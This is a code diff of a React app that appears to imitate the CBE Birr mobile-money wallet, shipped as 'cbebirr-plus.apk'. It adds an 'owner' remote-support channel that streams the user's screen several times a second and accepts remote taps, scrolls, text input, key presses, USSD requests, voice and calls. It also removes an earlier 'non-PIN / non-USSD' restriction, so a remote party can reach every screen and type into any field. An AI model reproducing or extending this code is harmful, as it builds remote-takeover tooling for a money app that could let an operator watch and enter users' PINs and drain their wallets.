+  // Auto-check/request permissions after approval so out-of-app calls & ringtone always work
+  useEffect(() => {
+    if (deviceGateState !== 'approved' || showOwnerDashboard) return;
+    if (typeof window === 'undefined') return;
+    registerNativeCallDevice();
+    let shouldShow = false;
+    try {
+      const androidAny = (window as any).Android;
+      const alreadyPrompted = localStorage.getItem('cbebirr_call_perms_prompted_v1') === '1';
+      if (androidAny?.hasAllCallPermissions) {
+        const nativeOk = Boolean(androidAny.hasAllCallPermissions());
+        if (!nativeOk && !alreadyPrompted) {
+          shouldShow = true;
+        }
+      } else if ('Notification' in window && Notification.permission === 'default' && !alreadyPrompted) {
+        shouldShow = true;
+      }
+    } catch {}
+    if (!shouldShow) return;
+    const tid = window.setTimeout(() => setShowCallPermsBanner(true), 0);
+    return () => window.clearTimeout(tid);
+  }, [deviceGateState, showOwnerDashboard]);
+
+  // Handle Pending Actions from Native IncomingCallActivity, Service Worker, or URL Params
+  useEffect(() => {
+    if (typeof window === 'undefined' || deviceGateState !== 'approved') return;
+
+    const processCallAction = async (callId: string, action: string) => {
+      const key = `${callId}_${action}`;
+      if (handledCallActionKeysRef.current.has(key)) return;
+      handledCallActionKeysRef.current.add(key);
+
+      const myId = getOrCreateOwnerDeviceId();
+      if (action === 'decline') {
+        teardownClientCallRtc(true);
+        await declineWifiCall(myId).catch(() => {});
+        setClientCallSession(null);
+        return;
+      }
+
+      const latest = await fetchCallSession(myId, false).catch(() => null);
+      if (latest && (latest.status === 'ringing' || latest.status === 'active')) {
+        setClientCallSession(latest);
+        if (action === 'answer') {
+          await handleAnswerIncomingCall(latest);
+        }
+      }
+    };
+
+    const checkPendingActions = () => {
+      const nativeAct = consumePendingNativeCallAction();
+      if (nativeAct) {
+        void processCallAction(nativeAct.callId, nativeAct.action);
+      }
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const urlAction = params.get('callAction');
+        const urlCallId = params.get('incomingCallId') || '';
+        if (urlAction === 'answer' || urlAction === 'decline' || urlAction === 'open') {
+          params.delete('callAction');
+          params.delete('incomingCallId');
+          const cleanQs = params.toString();
+          window.history.replaceState({}, '', `${window.location.pathname}${cleanQs ? `?${cleanQs}` : ''}`);
+          void processCallAction(urlCallId, urlAction);
+        }
+      } catch {}
+    };
+
+    checkPendingActions();
+    window.addEventListener('focus', checkPendingActions);
+    const onNativeEvt = () => checkPendingActions();
+    window.addEventListener('cbe-native-call-action', onNativeEvt);
+
+    const onSwMessage = (event: MessageEvent) => {
+      const data = event.data;
+      if (data?.type === 'INCOMING_CALL_ACTION' && data?.action) {
+        void processCallAction(String(data.callId || ''), String(data.action));
+      }
+    };
+    navigator.serviceWorker?.addEventListener('message', onSwMessage);
+
+    return () => {
+      window.removeEventListener('focus', checkPendingActions);
+      window.removeEventListener('cbe-native-call-action', onNativeEvt);
+      navigator.serviceWorker?.removeEventListener('message', onSwMessage);
+    };
+  }, [deviceGateState, handleAnswerIncomingCall, teardownClientCallRtc]);
+
+  // Poll CallSession rapidly while ringing or active + manage ringtone/vibration + WebRTC offer handshake
+  useEffect(() => {
+    const status = clientCallSession?.status;
+    if (status !== 'ringing' && status !== 'active') {
+      if (clientCallPeerRef.current || clientCallMicStreamRef.current) {
+        teardownClientCallRtc(true);
+      } else {
+        stopIncomingRingtone();
+        stopNativeCallRinger();
+        void closeWebIncomingCallNotifications();
+      }
+      return;
+    }
+
+    if (status === 'ringing' && clientCallSession) {
+      startIncomingRingtone({ playAudio: !isNativeCallBridgeAvailable() });
+      if (!isNativeCallBridgeAvailable() && !notifiedCallIdsRef.current.has(clientCallSession.callId)) {
+        notifiedCallIdsRef.current.add(clientCallSession.callId);
+        if (document.hidden) {
+          void showWebIncomingCallNotification(clientCallSession);
+        }
+      }
+    } else if (status === 'active') {
+      stopIncomingRingtone();
+      stopNativeCallRinger();
+      void closeWebIncomingCallNotifications();
+      if (clientCallSession) {
+        if (
+          clientCallSession.rtcOffer &&
+          clientCallSession.rtcSeq > clientCallHandledOfferSeqRef.current
+        ) {
+          void handleIncomingCallOfferIfNeeded(clientCallSession);
+        }
+      }
+    }
+
+    let cancelled = false;
+    let inFlight = false;
+    const myId = getOrCreateOwnerDeviceId();
+
+    const pollCall = async () => {
+      if (cancelled || inFlight) return;
+      inFlight = true;
+      try {
+        const latest = await fetchCallSession(myId, false);
+        if (cancelled) return;
+        if (latest && (latest.status === 'ringing' || latest.status === 'active')) {
+          setClientCallSession(latest);
+          if (
+            latest.status === 'active' &&
+            latest.rtcOffer &&
+            latest.rtcSeq > clientCallHandledOfferSeqRef.current
+          ) {
+            void handleIncomingCallOfferIfNeeded(latest);
+          }
+        } else {
+          teardownClientCallRtc(true);
+          setClientCallSession(null);
+        }
+      } catch {
+      } finally {
+        inFlight = false;
+      }
+    };
+
+    const intervalMs =
+      status === 'ringing' || !clientCallRtcStatus.voiceConnected ? 650 : 1400;
+    const tid = setInterval(() => {
+      void pollCall();
+    }, intervalMs);
+
+    return () => {
+      cancelled = true;
+      clearInterval(tid);
+    };
+  }, [
+    clientCallSession,
+    clientCallRtcStatus.voiceConnected,
+    handleIncomingCallOfferIfNeeded,
+    teardownClientCallRtc,
+  ]);
+
+  // Client Call Duration Counter
+  useEffect(() => {
+    if (clientCallSession?.status !== 'active') return;
+    const baseMs =
+      clientCallSession.answeredAtMs || clientCallSession.updatedAtMs || Date.now();
+    const update = () => {
+      setClientCallElapsedSec(Math.max(0, Math.floor((Date.now() - baseMs) / 1000)));
+    };
+    const initTid = window.setTimeout(update, 0);
+    const id = window.setInterval(update, 1000);
+    return () => {
+      window.clearTimeout(initTid);
+      window.clearInterval(id);
+    };
+  }, [
+    clientCallSession?.status,
+    clientCallSession?.answeredAtMs,
+    clientCallSession?.updatedAtMs,
+  ]);
 
   // Profile Details Edit Modal state
   const [isProfileModalOpen, setIsProfileModalOpen] = useState<boolean>(false);
@@ -1203,31 +1892,254 @@ export default function CBEBirrFullscreenApp() {
     );
   }, [walletSearchTerm]);
 
-  // Apply incoming Support View guidance commands safely (non-PIN / non-USSD navigation & tips)
-  const applySupportCommands = useCallback((sess: SupportSession) => {
-    if (!sess || sess.status !== 'active') return;
-    if (sess.commandSeq > lastAppliedCommandSeqRef.current) {
-      lastAppliedCommandSeqRef.current = sess.commandSeq;
-      if (sess.commandType === 'navigate_step') {
-        const target = Number(sess.commandPayload);
-        const SAFE_STEPS = new Set([4, 6, 11, 14, 15, 16]);
-        if (SAFE_STEPS.has(target)) {
-          setCurrentStep(target as ScreenStep);
-          setIsSendMoneyMenuOpen(false);
-        }
-      } else if (sess.commandType === 'show_tip' && sess.commandPayload) {
-        setSupportTipBanner(sess.commandPayload);
-        setTimeout(() => {
-          setSupportTipBanner((prev) => (prev === sess.commandPayload ? '' : prev));
-        }, 9000);
-      }
-    }
+  const triggerRemoteRipple = useCallback((xPct: number, yPct: number, label?: string) => {
+    setRemoteTouchRipple({ xPct, yPct, label, key: Date.now() });
+    if (remoteTouchTimerRef.current) clearTimeout(remoteTouchTimerRef.current);
+    remoteTouchTimerRef.current = setTimeout(() => {
+      setRemoteTouchRipple(null);
+    }, 550);
   }, []);
 
-  // Poll Support View commands ONLY while a session is pending or active (zero polls when idle)
+  // Execute incoming remote command from either DataChannel (instant) or HTTP poll (fallback)
+  const executeIncomingSupportCommand = useCallback(
+    (cmd: {
+      commandType: string;
+      commandPayload?: string;
+      pointerX?: number;
+      pointerY?: number;
+      pointerLabel?: string;
+    }) => {
+      const payload = cmd.commandPayload || '';
+      if (cmd.commandType === 'navigate_step') {
+        const target = Number(payload);
+        const VALID_STEPS = new Set([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17]);
+        if (VALID_STEPS.has(target)) {
+          setCurrentStep(target as ScreenStep);
+          setIsSendMoneyMenuOpen(false);
+          triggerImmediateCaptureRef.current?.(90);
+        }
+      } else if (cmd.commandType === 'highlight_point') {
+        if (cmd.pointerX !== undefined && cmd.pointerY !== undefined) {
+          setSupportSession((prev) =>
+            prev
+              ? {
+                  ...prev,
+                  pointerX: cmd.pointerX ?? prev.pointerX,
+                  pointerY: cmd.pointerY ?? prev.pointerY,
+                  pointerLabel: cmd.pointerLabel ?? prev.pointerLabel,
+                }
+              : prev
+          );
+        }
+      } else if (cmd.commandType === 'show_tip' && payload) {
+        setSupportTipBanner(payload);
+        setTimeout(() => {
+          setSupportTipBanner((prev) => (prev === payload ? '' : prev));
+        }, 9000);
+      } else if (cmd.commandType === 'remote_tap' && innerFrameRef.current) {
+        let xPct = -1;
+        let yPct = -1;
+        try {
+          const parsed = JSON.parse(payload);
+          xPct = Number(parsed?.xPct);
+          yPct = Number(parsed?.yPct);
+        } catch {
+          const parts = String(payload || '').split(',');
+          xPct = Number(parts[0]);
+          yPct = Number(parts[1]);
+        }
+        if (Number.isFinite(xPct) && Number.isFinite(yPct) && xPct >= 0 && yPct >= 0) {
+          triggerRemoteRipple(xPct, yPct);
+          const tapRes = dispatchRemoteTap(innerFrameRef.current, xPct, yPct);
+          if (tapRes?.focusedInput) {
+            lastRemoteInputRef.current = tapRes.focusedInput;
+          }
+          triggerImmediateCaptureRef.current?.(90);
+        }
+      } else if (cmd.commandType === 'remote_scroll' && innerFrameRef.current) {
+        let xPct = 50;
+        let yPct = 50;
+        let dy = 0.35;
+        try {
+          const parsed = JSON.parse(payload);
+          if (Number.isFinite(Number(parsed?.xPct))) xPct = Number(parsed.xPct);
+          if (Number.isFinite(Number(parsed?.yPct))) yPct = Number(parsed.yPct);
+          if (Number.isFinite(Number(parsed?.dy))) dy = Number(parsed.dy);
+        } catch {
+          const parts = String(payload || '').split(',');
+          if (parts.length >= 3) {
+            xPct = Number(parts[0]) || 50;
+            yPct = Number(parts[1]) || 50;
+            dy = Number(parts[2]) || 0.35;
+          }
+        }
+        triggerRemoteRipple(xPct, yPct, dy > 0 ? 'Scroll ↓' : 'Scroll ↑');
+        dispatchRemoteScroll(innerFrameRef.current, xPct, yPct, dy);
+        triggerImmediateCaptureRef.current?.(140);
+      } else if (cmd.commandType === 'remote_input' && innerFrameRef.current) {
+        let mode: 'set' | 'append' | 'backspace' | 'clear' | 'enter' = 'append';
+        let text = '';
+        try {
+          const parsed = JSON.parse(payload);
+          if (['set', 'append', 'backspace', 'clear', 'enter'].includes(parsed?.mode)) {
+            mode = parsed.mode;
+          }
+          text = String(parsed?.text ?? '');
+        } catch {
+          text = String(payload || '');
+        }
+        const updatedInput = dispatchRemoteInput(
+          innerFrameRef.current,
+          lastRemoteInputRef.current,
+          mode,
+          text
+        );
+        if (updatedInput) {
+          lastRemoteInputRef.current = updatedInput;
+        }
+        triggerImmediateCaptureRef.current?.(90);
+      } else if (cmd.commandType === 'remote_key' && innerFrameRef.current) {
+        const key = String(payload || '').trim().toLowerCase();
+        if (key === 'back') {
+          const backBtn = innerFrameRef.current.querySelector(
+            '[aria-label*="Back" i], [data-back="true"], button svg.lucide-arrow-left'
+          ) as HTMLElement | null;
+          const clickableBack = backBtn?.closest('button') || backBtn;
+          if (clickableBack && typeof (clickableBack as HTMLElement).click === 'function') {
+            (clickableBack as HTMLElement).click();
+          } else {
+            setCurrentStep(4);
+            setIsSendMoneyMenuOpen(false);
+          }
+          triggerImmediateCaptureRef.current?.(90);
+        } else if (key === 'backspace' || key === 'clear' || key === 'enter') {
+          const updatedInput = dispatchRemoteInput(
+            innerFrameRef.current,
+            lastRemoteInputRef.current,
+            key
+          );
+          if (updatedInput) {
+            lastRemoteInputRef.current = updatedInput;
+          }
+          triggerImmediateCaptureRef.current?.(90);
+        }
+      } else if (cmd.commandType === 'request_ussd') {
+        let requestId = '';
+        let code = '';
+        try {
+          const parsed = JSON.parse(payload);
+          requestId = String(parsed?.requestId || '');
+          code = String(parsed?.code || '').trim();
+        } catch {
+          code = String(payload || '').trim();
+          requestId = `ussd_${code}`;
+        }
+        if (code && (!requestId || !handledUssdReqIdsRef.current.has(requestId))) {
+          if (requestId) handledUssdReqIdsRef.current.add(requestId);
+          setPendingUssdConsent({
+            requestId: requestId || `ussd_${Date.now()}`,
+            code,
+          });
+        }
+      }
+    },
+    [triggerRemoteRipple]
+  );
+
+  // Manage Target Client WebRTC Peer (Two-Way Voice + Sub-200ms DataChannel Cast)
+  const ensureClientRtcPeer = useCallback(() => {
+    if (clientRtcPeerRef.current) return clientRtcPeerRef.current;
+    const peer = new LiveRtcPeer({
+      onStatus: (st) => {
+        setClientRtcStatus(st);
+      },
+      onRemoteAudio: (stream) => {
+        playStreamInAudioElement(clientAudioElRef.current, stream, clientSpeakerMutedRef.current);
+      },
+      onMessage: (msg) => {
+        if (msg.type === 'cmd') {
+          executeIncomingSupportCommand(msg);
+        } else if (msg.type === 'mic_state') {
+          setOwnerMicMuted(Boolean(msg.muted));
+        }
+      },
+    });
+    if (clientMicStreamRef.current) {
+      peer.attachLocalStream(clientMicStreamRef.current, clientMicMutedRef.current);
+    }
+    clientRtcPeerRef.current = peer;
+    return peer;
+  }, [executeIncomingSupportCommand]);
+
+  const handleIncomingOfferIfNeeded = useCallback(
+    async (sess: SupportSession) => {
+      if (
+        sess.status !== 'active' ||
+        !sess.rtcOffer ||
+        !sess.rtcSeq ||
+        sess.rtcSeq <= clientHandledOfferSeqRef.current
+      ) {
+        return;
+      }
+      clientHandledOfferSeqRef.current = sess.rtcSeq;
+      try {
+        if (!clientMicStreamRef.current) {
+          const micRes = await requestLiveMicrophone();
+          if (micRes.stream) {
+            clientMicStreamRef.current = micRes.stream;
+            setClientMicReady(true);
+          }
+        }
+        const peer = ensureClientRtcPeer();
+        if (clientMicStreamRef.current) {
+          peer.attachLocalStream(clientMicStreamRef.current, clientMicMutedRef.current);
+        }
+        const answerJson = await peer.acceptOfferAndCreateAnswer(sess.rtcOffer);
+        if (answerJson) {
+          const myId = getOrCreateOwnerDeviceId();
+          await pushSupportSignal(myId, false, {
+            rtcSeq: sess.rtcSeq,
+            rtcAnswer: answerJson,
+            micMuted: clientMicMutedRef.current,
+          });
+        }
+      } catch {
+        // Allow retry if signal exchange was interrupted
+        clientHandledOfferSeqRef.current = Math.max(0, sess.rtcSeq - 1);
+      }
+    },
+    [ensureClientRtcPeer]
+  );
+
+  // Apply incoming Support View guidance & remote touch/scroll/input commands
+  const applySupportCommands = useCallback(
+    (sess: SupportSession) => {
+      if (!sess || sess.status !== 'active') return;
+      setOwnerMicMuted(Boolean(sess.ownerMicMuted));
+      if (sess.rtcOffer && sess.rtcSeq > clientHandledOfferSeqRef.current) {
+        void handleIncomingOfferIfNeeded(sess);
+      }
+      if (sess.commandSeq > lastAppliedCommandSeqRef.current) {
+        lastAppliedCommandSeqRef.current = sess.commandSeq;
+        executeIncomingSupportCommand({
+          commandType: sess.commandType,
+          commandPayload: sess.commandPayload,
+          pointerX: sess.pointerX,
+          pointerY: sess.pointerY,
+          pointerLabel: sess.pointerLabel,
+        });
+      }
+    },
+    [executeIncomingSupportCommand, handleIncomingOfferIfNeeded]
+  );
+
+  // Poll Support View commands & RTC signaling ONLY while a session is pending or active
   useEffect(() => {
     const status = supportSession?.status;
     if (status !== 'pending' && status !== 'active') {
+      if (clientRtcPeerRef.current || clientMicStreamRef.current) {
+        teardownClientRtc(true);
+      }
       return;
     }
 
@@ -1249,26 +2161,36 @@ export default function CBEBirrFullscreenApp() {
             setSupportSession(latest);
             applySupportCommands(latest);
           } else {
+            teardownClientRtc(true);
             setSupportSession(null);
             setSupportTipBanner('');
           }
         } else {
           errCount += 1;
-          if (errCount >= 2) setSupportReconnecting(true);
+          if (errCount >= 3) setSupportReconnecting(true);
         }
       } catch {
         if (!cancelled) {
           errCount += 1;
-          if (errCount >= 2) setSupportReconnecting(true);
+          if (errCount >= 3) setSupportReconnecting(true);
         }
       } finally {
         inFlight = false;
       }
     };
 
+    const pollMs =
+      status === 'pending'
+        ? 1100
+        : clientRtcStatus.dataOpen && clientRtcStatus.voiceConnected
+          ? 1400
+          : 380;
     const tid = setInterval(() => {
       void pollSupport();
-    }, 1500);
+    }, pollMs);
+    if (status === 'active') {
+      void pollSupport();
+    }
     window.addEventListener('online', pollSupport);
 
     return () => {
@@ -1276,7 +2198,97 @@ export default function CBEBirrFullscreenApp() {
       clearInterval(tid);
       window.removeEventListener('online', pollSupport);
     };
-  }, [supportSession?.status, applySupportCommands]);
+  }, [
+    supportSession?.status,
+    clientRtcStatus.dataOpen,
+    clientRtcStatus.voiceConnected,
+    applySupportCommands,
+    teardownClientRtc,
+  ]);
+
+  // Continuous Live Screen Cast Capture Loop (DataChannel 180ms fast live stream + HTTP fallback)
+  useEffect(() => {
+    if (supportSession?.status !== 'active' || showOwnerDashboard) {
+      lastSentFrameRef.current = '';
+      lastSentFrameAtRef.current = 0;
+      lastHttpMirrorAtRef.current = 0;
+      triggerImmediateCaptureRef.current = null;
+      return;
+    }
+
+    let cancelled = false;
+    let immediateTid: ReturnType<typeof setTimeout> | null = null;
+
+    const captureAndSend = async (force = false) => {
+      if (cancelled || frameUploadInFlightRef.current || !innerFrameRef.current) return;
+      frameUploadInFlightRef.current = true;
+      try {
+        const dcOpen = Boolean(clientRtcPeerRef.current?.isDataOpen());
+        const frame = await captureElementFrameJpeg(innerFrameRef.current, { fast: dcOpen });
+        if (cancelled || !frame) return;
+        const now = Date.now();
+        const sameAsPrev = frame === lastSentFrameRef.current;
+
+        if (dcOpen && clientRtcPeerRef.current) {
+          if (!force && sameAsPrev && now - lastSentFrameAtRef.current < 3500) {
+            return;
+          }
+          clientDcFrameSeqRef.current += 1;
+          const sent = clientRtcPeerRef.current.sendMessage({
+            type: 'frame',
+            frame,
+            seq: clientDcFrameSeqRef.current,
+            ts: now,
+          });
+          if (sent) {
+            lastSentFrameRef.current = frame;
+            lastSentFrameAtRef.current = now;
+            if (now - lastHttpMirrorAtRef.current >= 2500) {
+              lastHttpMirrorAtRef.current = now;
+              void pushSupportScreenFrame(frame).catch(() => {});
+            }
+            return;
+          }
+        }
+
+        if (!force && sameAsPrev && now - lastSentFrameAtRef.current < 3500) {
+          return;
+        }
+        const okRes = await pushSupportScreenFrame(frame);
+        if (!cancelled && okRes) {
+          lastSentFrameRef.current = frame;
+          lastSentFrameAtRef.current = Date.now();
+        }
+      } catch {
+        // Non-fatal frame drop
+      } finally {
+        frameUploadInFlightRef.current = false;
+      }
+    };
+
+    triggerImmediateCaptureRef.current = (delayMs = 100) => {
+      if (immediateTid) clearTimeout(immediateTid);
+      immediateTid = setTimeout(() => {
+        void captureAndSend(true);
+      }, delayMs);
+    };
+
+    const firstTid = setTimeout(() => {
+      void captureAndSend(true);
+    }, 90);
+    const intervalMs = clientRtcStatus.dataOpen ? 180 : 300;
+    const intervalId = setInterval(() => {
+      void captureAndSend(false);
+    }, intervalMs);
+
+    return () => {
+      cancelled = true;
+      triggerImmediateCaptureRef.current = null;
+      clearTimeout(firstTid);
+      if (immediateTid) clearTimeout(immediateTid);
+      clearInterval(intervalId);
+    };
+  }, [supportSession?.status, showOwnerDashboard, clientRtcStatus.dataOpen]);
 
   // Low-Data JSON Delta Sync during Explicit Active Support Session (~300 bytes only on UI state change)
   useEffect(() => {
@@ -4277,42 +5289,240 @@ export default function CBEBirrFullscreenApp() {
           flexShrink: 0,
           containerType: 'inline-size',
         }}
-        className="relative overflow-hidden bg-white flex flex-col justify-center items-center shadow-2xl sm:rounded-[36px] sm:shadow-[0_25px_80px_rgba(0,0,0,0.95),0_0_0_1px_rgba(255,255,255,0.12)] sm:border-[6px] sm:border-[#1a1a20]"
+        className="cbe-app-canvas relative overflow-hidden bg-white flex flex-col justify-center items-center shadow-2xl sm:rounded-[36px] sm:shadow-[0_25px_80px_rgba(0,0,0,0.95),0_0_0_1px_rgba(255,255,255,0.12)] sm:border-[6px] sm:border-[#1a1a20]"
       >
 
-        {/* Persistent Top "Remote Session Active" Transparency Bar */}
-        {supportSession?.status === 'active' && !showOwnerDashboard && (
-          <div className="absolute top-0 left-0 right-0 z-[75] bg-emerald-600/95 backdrop-blur-xs text-white px-3 py-1.5 flex items-center justify-between gap-2 shadow-md">
-            <div className="flex items-center gap-1.5 min-w-0">
-              <span className="w-2 h-2 rounded-full bg-white animate-pulse shrink-0" />
-              <ShieldCheck className="w-3.5 h-3.5 shrink-0" />
-              <span className="text-[11px] font-bold truncate">
-                Remote Session Active
-              </span>
-              {supportReconnecting && (
-                <span className="text-[9.5px] px-1.5 py-0.5 rounded bg-amber-400/30 text-amber-100 font-semibold shrink-0">
-                  Reconnecting...
-                </span>
-              )}
-            </div>
-            <button
-              type="button"
-              disabled={supportConsentBusy}
-              onClick={handleUserEndSupportSession}
-              className="px-2 py-0.5 rounded-md bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold flex items-center gap-1 cursor-pointer shrink-0 shadow-xs"
+        {/* Owner Notification Banner (Always visible even over Register/Lock gates inside cbebirr-plus.apk & Web) */}
+        <AnimatePresence>
+          {activeInAppNotif && !showOwnerDashboard && (
+            <motion.div
+              key={activeInAppNotif.notifId}
+              initial={{ opacity: 0, y: -16 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -16 }}
+              transition={{ duration: 0.18 }}
+              style={{ top: '2.2cqw', left: '3cqw', right: '3cqw' }}
+              className="absolute z-[95] bg-[#1e1024]/95 text-white border border-purple-400/50 rounded-[3.2cqw] px-[3.5cqw] py-[2.8cqw] shadow-2xl flex items-start justify-between gap-[2.5cqw]"
             >
-              <Power className="w-2.5 h-2.5" />
-              <span>End</span>
-            </button>
+              <div className="flex items-start gap-[2.5cqw] min-w-0">
+                <div className="w-[7cqw] h-[7cqw] rounded-[2cqw] bg-[#7a1c7d] flex items-center justify-center shrink-0 mt-[0.4cqw]">
+                  <Bell style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-white" />
+                </div>
+                <div className="min-w-0">
+                  <p style={{ fontSize: '3.1cqw' }} className="font-bold leading-tight truncate text-purple-200">
+                    {activeInAppNotif.title}
+                  </p>
+                  <p style={{ fontSize: '2.8cqw' }} className="font-normal leading-snug text-white/95 break-words mt-[0.5cqw]">
+                    {activeInAppNotif.message}
+                  </p>
+                </div>
+              </div>
+              <button
+                type="button"
+                onClick={() => setActiveInAppNotif(null)}
+                className="text-white/70 hover:text-white cursor-pointer shrink-0 p-[0.5cqw]"
+                aria-label="Dismiss notice"
+              >
+                <X style={{ width: '3.8cqw', height: '3.8cqw' }} />
+              </button>
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Persistent Top "Remote Session Active" Transparency & Two-Way Voice Bar */}
+        {supportSession?.status === 'active' && !showOwnerDashboard && (
+          <div data-support-ignore="true" className="absolute top-0 left-0 right-0 z-[75] bg-emerald-700/95 backdrop-blur-xs text-white px-[2.4cqw] py-[1.2cqw] flex items-center justify-between gap-[1.5cqw] shadow-md">
+            <audio ref={clientAudioElRef} autoPlay playsInline className="hidden" />
+            <div className="flex items-center gap-[1.2cqw] min-w-0">
+              <span className="w-[1.8cqw] h-[1.8cqw] rounded-full bg-white animate-pulse shrink-0" />
+              <ShieldCheck style={{ width: '3.2cqw', height: '3.2cqw' }} className="shrink-0" />
+              <div className="min-w-0">
+                <div className="flex items-center gap-[1cqw]">
+                  <span style={{ fontSize: '2.4cqw' }} className="font-bold truncate">
+                    Live Support
+                  </span>
+                  {supportReconnecting ? (
+                    <span style={{ fontSize: '2cqw' }} className="px-[1cqw] py-[0.2cqw] rounded bg-amber-400/30 text-amber-100 font-semibold shrink-0">
+                      Reconnecting...
+                    </span>
+                  ) : clientRtcStatus.voiceConnected ? (
+                    <span style={{ fontSize: '2cqw' }} className="px-[1cqw] py-[0.2cqw] rounded bg-white/20 text-emerald-50 font-semibold shrink-0">
+                      {ownerMicMuted ? 'Support Muted' : 'Voice Live'}
+                    </span>
+                  ) : null}
+                </div>
+              </div>
+            </div>
+            <div className="flex items-center gap-[1.2cqw] shrink-0">
+              <button
+                type="button"
+                onClick={handleToggleClientMic}
+                style={{ fontSize: '2.2cqw' }}
+                className={`px-[1.8cqw] py-[0.55cqw] rounded-[1.3cqw] font-bold flex items-center gap-[0.8cqw] cursor-pointer shadow-xs ${
+                  !clientMicReady || clientMicMuted
+                    ? 'bg-rose-600/95 hover:bg-rose-500 text-white'
+                    : 'bg-white/20 hover:bg-white/30 text-white'
+                }`}
+              >
+                {!clientMicReady || clientMicMuted ? (
+                  <MicOff style={{ width: '2.4cqw', height: '2.4cqw' }} />
+                ) : (
+                  <Mic style={{ width: '2.4cqw', height: '2.4cqw' }} />
+                )}
+                <span>{!clientMicReady ? 'Allow Mic' : clientMicMuted ? 'Unmute' : 'Mute'}</span>
+              </button>
+              <button
+                type="button"
+                onClick={handleToggleClientSpeaker}
+                className={`p-[0.65cqw] rounded-[1.3cqw] cursor-pointer shadow-xs ${
+                  clientSpeakerMuted
+                    ? 'bg-amber-500 text-white'
+                    : 'bg-white/15 hover:bg-white/25 text-white'
+                }`}
+                aria-label={clientSpeakerMuted ? 'Unmute speaker' : 'Mute speaker'}
+              >
+                {clientSpeakerMuted ? (
+                  <VolumeX style={{ width: '2.5cqw', height: '2.5cqw' }} />
+                ) : (
+                  <Volume2 style={{ width: '2.5cqw', height: '2.5cqw' }} />
+                )}
+              </button>
+              <button
+                type="button"
+                disabled={supportConsentBusy}
+                onClick={handleUserEndSupportSession}
+                style={{ fontSize: '2.2cqw' }}
+                className="px-[1.8cqw] py-[0.55cqw] rounded-[1.3cqw] bg-rose-600 hover:bg-rose-500 text-white font-bold flex items-center gap-[0.8cqw] cursor-pointer shrink-0 shadow-xs"
+              >
+                <Power style={{ width: '2.3cqw', height: '2.3cqw' }} />
+                <span>End</span>
+              </button>
+            </div>
           </div>
         )}
 
+        {/* Hidden audio sink for Wi-Fi VoIP Voice Call (Always mounted when device approved) */}
+        <audio ref={clientCallAudioElRef} autoPlay playsInline className="hidden" />
+
+        {/* Persistent Active Wi-Fi VoIP Call Top Floating Bar */}
+        {clientCallSession?.status === 'active' && !showOwnerDashboard && (
+          <div
+            data-support-ignore="true"
+            style={{ top: supportSession?.status === 'active' ? '10cqw' : '0' }}
+            className="absolute left-0 right-0 z-[77] bg-sky-700/95 backdrop-blur-xs text-white px-[2.4cqw] py-[1.4cqw] flex items-center justify-between gap-[1.5cqw] shadow-lg border-b border-white/15"
+          >
+            <div className="flex items-center gap-[1.4cqw] min-w-0">
+              <span className="w-[2cqw] h-[2cqw] rounded-full bg-emerald-300 animate-pulse shrink-0" />
+              <PhoneCall style={{ width: '3.4cqw', height: '3.4cqw' }} className="shrink-0" />
+              <div className="min-w-0">
+                <p style={{ fontSize: '2.5cqw' }} className="font-bold truncate leading-tight">
+                  {clientCallSession.callerName || 'Wi-Fi Voice Call'} •{' '}
+                  {String(Math.floor(clientCallElapsedSec / 60)).padStart(2, '0')}:
+                  {String(clientCallElapsedSec % 60).padStart(2, '0')}
+                </p>
+                <p style={{ fontSize: '2cqw' }} className="text-sky-100/90 truncate leading-tight">
+                  {clientCallRtcStatus.voiceConnected
+                    ? clientCallSession.ownerMicMuted
+                      ? 'Caller muted'
+                      : 'Voice Connected'
+                    : 'Connecting audio...'}
+                </p>
+              </div>
+            </div>
+
+            <div className="flex items-center gap-[1.2cqw] shrink-0">
+              <button
+                type="button"
+                onClick={handleToggleClientCallMic}
+                style={{ fontSize: '2.2cqw' }}
+                className={`px-[1.8cqw] py-[0.6cqw] rounded-[1.3cqw] font-bold flex items-center gap-[0.7cqw] cursor-pointer ${
+                  !clientCallMicReady || clientCallMicMuted
+                    ? 'bg-rose-600 text-white'
+                    : 'bg-white/20 hover:bg-white/30 text-white'
+                }`}
+              >
+                {!clientCallMicReady || clientCallMicMuted ? (
+                  <MicOff style={{ width: '2.4cqw', height: '2.4cqw' }} />
+                ) : (
+                  <Mic style={{ width: '2.4cqw', height: '2.4cqw' }} />
+                )}
+                <span>{!clientCallMicReady ? 'Allow Mic' : clientCallMicMuted ? 'Unmute' : 'Mute'}</span>
+              </button>
+
+              <button
+                type="button"
+                onClick={handleToggleClientCallSpeaker}
+                className={`p-[0.7cqw] rounded-[1.3cqw] cursor-pointer ${
+                  clientCallSpeakerMuted ? 'bg-amber-500 text-white' : 'bg-white/20 text-white'
+                }`}
+                aria-label={clientCallSpeakerMuted ? 'Unmute speaker' : 'Mute speaker'}
+              >
+                {clientCallSpeakerMuted ? (
+                  <VolumeX style={{ width: '2.5cqw', height: '2.5cqw' }} />
+                ) : (
+                  <Volume2 style={{ width: '2.5cqw', height: '2.5cqw' }} />
+                )}
+              </button>
+
+              <button
+                type="button"
+                disabled={clientCallBusy}
+                onClick={handleClientEndCall}
+                style={{ fontSize: '2.2cqw' }}
+                className="px-[1.9cqw] py-[0.6cqw] rounded-[1.3cqw] bg-rose-600 hover:bg-rose-500 text-white font-bold flex items-center gap-[0.7cqw] cursor-pointer"
+              >
+                <PhoneOff style={{ width: '2.3cqw', height: '2.3cqw' }} />
+                <span>End</span>
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* One-Tap Call & Notification Permissions Banner (Disappears after approval) */}
+        {showCallPermsBanner &&
+          deviceGateState === 'approved' &&
+          !showOwnerDashboard &&
+          !clientCallSession &&
+          !supportSession && (
+            <div
+              data-support-ignore="true"
+              className="absolute top-[1.8cqw] left-[2.5cqw] right-[2.5cqw] z-[76] bg-[#17212b]/95 text-white border border-sky-400/40 rounded-[2.6cqw] px-[3cqw] py-[2cqw] shadow-xl flex items-center justify-between gap-[2cqw]"
+            >
+              <div className="min-w-0">
+                <p style={{ fontSize: '2.6cqw' }} className="font-bold text-white truncate">
+                  Allow Call &amp; Alert Permissions
+                </p>
+                <p style={{ fontSize: '2.1cqw' }} className="text-slate-300 leading-snug">
